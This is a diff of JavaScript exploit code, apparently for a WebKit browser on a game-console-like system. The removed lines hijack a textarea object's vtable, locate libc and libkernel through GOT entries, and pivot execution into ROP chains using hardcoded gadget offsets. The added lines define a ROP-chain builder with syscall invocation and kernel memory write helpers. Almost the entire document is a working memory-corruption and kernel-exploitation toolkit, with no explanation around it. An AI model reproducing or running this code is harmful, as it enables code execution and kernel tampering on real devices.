@@ -1,90 +1,165 @@
-var tarea = document.createElement('textarea');
+const stack_sz = 0x40000;
+const reserve_upper_stack = 0x8000;
+const stack_reserved_idx = reserve_upper_stack / 4;
 
-var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
-var fake_vt_ptr = malloc(0x400);
-write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
 
-var real_vtable = read_ptr_at(fake_vt_ptr);
-var fake_vtable = malloc(0x2000);
-write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
-write_ptr_at(fake_vt_ptr, fake_vtable);
+// Class for quickly creating and managing a ROP chain
+window.rop = function () {
+    this.stackback = p.malloc32(stack_sz / 4 + 0x8);
+    this.stack = this.stackback.add32(reserve_upper_stack);
+    this.stack_array = this.stackback.backing;
+    this.retval = this.stackback.add32(stack_sz);
+    this.count = 1;
+    this.branches_count = 0;
+    this.branches_rsps = p.malloc(0x200);
 
-var fake_vt_ptr_bak = malloc(0x400);
-write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
+    this.clear = function () {
+        this.count = 1;
+        this.branches_count = 0;
 
-var plt_ptr = read_ptr_at(fake_vtable) - 17100888;
+        for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
+            this.stack_array[i + stack_reserved_idx] = 0;
+        }
+    };
 
-function get_got_addr(idx)
-{
-    var p = plt_ptr + idx * 16;
-    var q = read_mem(p, 6);
-    if(q[0] != 0xff || q[1] != 0x25)
-        throw "invalid GOT entry";
-    var offset = 0;
-    for(var i = 5; i >= 2; i--)
-        offset = offset * 256 + q[i];
-    offset += p + 6;
-    return read_ptr_at(offset);
-}
+    this.pushSymbolic = function () {
+        this.count++;
+        return this.count - 1;
+    }
 
-//these are not real bases but rather some low addresses
-var webkit_base = read_ptr_at(fake_vtable) - 0x1000000;
-var libkernel_base = get_got_addr(1111);
-var libc_base = get_got_addr(21);
-var saveall_addr = libc_base+0x21944;
-var loadall_addr = libc_base+0x25e88;
-var pivot_addr = libc_base+0x25efe;
-var infloop_addr = libc_base+0x395c0;
-var jop_frame_addr = libc_base+0x661d0;
-var get_errno_addr_addr = libkernel_base+0xc480;
-var pthread_create_addr = libkernel_base+0x24e10;
+    this.finalizeSymbolic = function (idx, val) {
+        if (val instanceof int64) {
+            this.stack_array[stack_reserved_idx + idx * 2] = val.low;
+            this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
+        } else {
+            this.stack_array[stack_reserved_idx + idx * 2] = val;
+            this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
+        }
+    }
 
-function saveall()
-{
-    var ans = malloc(0x800);
-    var bak = read_ptr_at(fake_vtable+0x1d8);
-    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
-    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
-    tarea.scrollLeft = 0;
-    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
-    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
-    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-    var bak = read_ptr_at(fake_vtable+0x1d8);
-    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
-    write_ptr_at(fake_vt_ptr+0x38, 0x1234);
-    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
-    tarea.scrollLeft = 0;
-    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
-    write_mem(ans+0x400, read_mem(fake_vt_ptr, 0x400));
-    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-    return ans;
-}
+    this.push = function (val) {
+        this.finalizeSymbolic(this.pushSymbolic(), val);
+    }
 
-/* PUBLIC ROP API
+    this.push_write8 = function (where, what) {
+        this.push(gadgets["pop rdi"]);
+        this.push(where);
+        this.push(gadgets["pop rsi"]);
+        this.push(what);
+        this.push(gadgets["mov [rdi], rsi"]);
+    }
 
-This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
-* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
-* the actual ROP chain starts at `buf+8`
-* jump to `pivot_addr` to return
-*/
-function pivot(buf)
-{
-    var ans = malloc(0x400);
-    var bak = read_ptr_at(fake_vtable+0x1c8/*0x1d8*/);
-    write_ptr_at(fake_vtable+0x1c8/*0x1d8*/, saveall_addr);
-    //write_ptr_at(fake_vt_ptr, 1);
-    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
-    tarea.scrollLeft = 0;
-    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
-    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
-    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-    var bak = read_ptr_at(fake_vtable+0x1c8/*0x1d8*/);
-    write_ptr_at(fake_vtable+0x1c8/*0x1d8*/, pivot_addr);
-    write_ptr_at(fake_vt_ptr+0x38, buf);
-    write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
-    write_ptr_at(buf, ans);
-    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
-    tarea.scrollLeft = 0;
-    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
-    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-}
+    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
+        if (rdi != undefined) {
+            this.push(gadgets["pop rdi"]);
+            this.push(rdi);
+        }
+
+        if (rsi != undefined) {
+            this.push(gadgets["pop rsi"]);
+            this.push(rsi);
+        }
+
+        if (rdx != undefined) {
+            this.push(gadgets["pop rdx"]);
+            this.push(rdx);
+        }
+
+        if (rcx != undefined) {
+            this.push(gadgets["pop rcx"]);
+            this.push(rcx);
+        }
+
+        if (r8 != undefined) {
+            this.push(gadgets["pop r8"]);
+            this.push(r8);
+        }
+
+        if (r9 != undefined) {
+            this.push(gadgets["pop r9"]);
+            this.push(r9);
+        }
+
+        this.push(rip);
+        return this;
+    }
+
+    this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
+        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
+        this.write_result(this.retval);
+        this.run();
+        return p.read8(this.retval);
+    }
+
+    this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
+        return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+    }
+
+    //get rsp of the next push
+    this.get_rsp = function () {
+        return this.stack.add32(this.count * 8);
+    }
+    this.write_result = function (where) {
+        this.push(gadgets["pop rdi"]);
+        this.push(where);
+        this.push(gadgets["mov [rdi], rax"]);
+    }
+    this.write_result4 = function (where) {
+        this.push(gadgets["pop rdi"]);
+        this.push(where);
+        this.push(gadgets["mov [rdi], eax"]);
+    }
+
+    this.jmp_rsp = function (rsp) {
+        this.push(window.gadgets["pop rsp"]);
+        this.push(rsp);
+    }
+
+    this.run = function () {
+        p.launch_chain(this);
+        this.clear();
+    }
+
+    this.KERNEL_BASE_PTR_VAR;
+    this.set_kernel_var = function (arg) {
+        this.KERNEL_BASE_PTR_VAR = arg;
+    }
+
+    this.rax_kernel = function (offset) {
+        this.push(gadgets["pop rax"]);
+        this.push(this.KERNEL_BASE_PTR_VAR)
+        this.push(gadgets["mov rax, [rax]"]);
+        this.push(gadgets["pop rsi"]);
+        this.push(offset)
+        this.push(gadgets["add rax, rsi"]);
+    }
+
+    this.write_kernel_addr_to_chain_later = function (offset) {
+        this.push(gadgets["pop rdi"]);
+        var idx = this.pushSymbolic();
+        this.rax_kernel(offset);
+        this.push(gadgets["mov [rdi], rax"]);
+        return idx;
+    }
+
+    this.kwrite8 = function (offset, qword) {
+        this.rax_kernel(offset);
+        this.push(gadgets["pop rsi"]);
+        this.push(qword);
+        this.push(gadgets["mov [rax], rsi"]);
+    }
+    this.kwrite4 = function (offset, dword) {
+        this.rax_kernel(offset);
+        this.push(gadgets["pop rdx"]);
+        this.push(dword);
+        this.push(gadgets["mov [rax], edx"]);
+    }
+
+    this.kwrite8_kaddr = function (offset1, offset2) {
+        this.rax_kernel(offset2);
+        this.push(gadgets["mov rdx, rax"]);
+        this.rax_kernel(offset1);
+        this.push(gadgets["mov [rax], rdx"]);
+    }
+    return this;
+};
